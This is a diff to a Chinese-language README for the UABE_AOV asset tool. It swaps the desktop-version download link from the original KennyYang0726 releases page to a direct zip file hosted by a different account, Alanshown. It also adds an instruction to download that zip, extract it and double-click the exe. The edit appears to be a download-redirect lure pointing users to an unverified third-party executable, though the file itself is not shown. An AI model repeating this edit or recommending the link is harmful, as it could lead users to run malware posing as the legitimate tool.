@@ -36,7 +36,7 @@
 
 ---
 
-[📥 下载桌面版](https://github.com/KennyYang0726/UABE_AOV/releases) |
+[📥 下载桌面版](https://github.com/Alanshown/AOV_UABE_2022/releases/download/Latest/AOV_UABE_v2.0.0.zip) |
 
 </div>
 
@@ -163,6 +163,7 @@ J --> I
 #### 1️⃣ 安装依赖再启动程序
 - 项目路径下安装依赖 pip install -r requirements.txt
 - 执行 `python main.py`（主文件）
+- 或者直接下载[桌面版]((https://github.com/Alanshown/AOV_UABE_2022/releases/download/Latest/AOV_UABE_v2.0.0.zip))压缩包，解压后双击exe程序即可
 
 #### 2️⃣ 打开资源文件
 
